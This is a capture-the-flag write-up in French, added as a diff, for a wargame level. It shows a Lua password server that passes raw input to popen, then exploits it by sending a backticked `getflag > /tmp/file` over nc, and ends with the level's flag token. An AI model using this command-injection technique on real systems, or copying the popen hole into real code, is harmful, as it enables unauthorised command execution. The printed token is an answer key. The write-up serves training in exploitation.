@@ -1,0 +1,42 @@
+strings level11.lua
+
+#!/usr/bin/env lua
+local socket = require("socket")
+local server = assert(socket.bind("127.0.0.1", 5151))
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+  data = prog:read("*all")
+  prog:close()
+  data = string.sub(data, 1, 40)
+  return data
+while 1 do
+  local client = server:accept()
+  client:send("Password: ")
+  client:settimeout(60)
+  local l, err = client:receive()
+  if not err then
+      print("trying " .. l)
+      local h = hash(l)
+      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+          client:send("Erf nope..\n");
+      else
+          client:send("Gz you dumb*\n")
+      end
+  end
+  client:close()
+
+The popen() function shall execute the command specified by the string command.
+
+On peut exploiter popen grace a echo en utilisant ``:
+
+On commence par se connecter sur 127.0.0.1:5151:
+nc 127.0.0.1 5151
+
+Quand on nous demande le mot de passe, on tape ceci:
+`getflag > /tmp/file`
+Cela va nous permettre de mettre le resultat de la commande getflag dans le fichier tmp
+
+On affiche ensuite le résultat de la commande getflag:
+cat /tmp/file
+
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
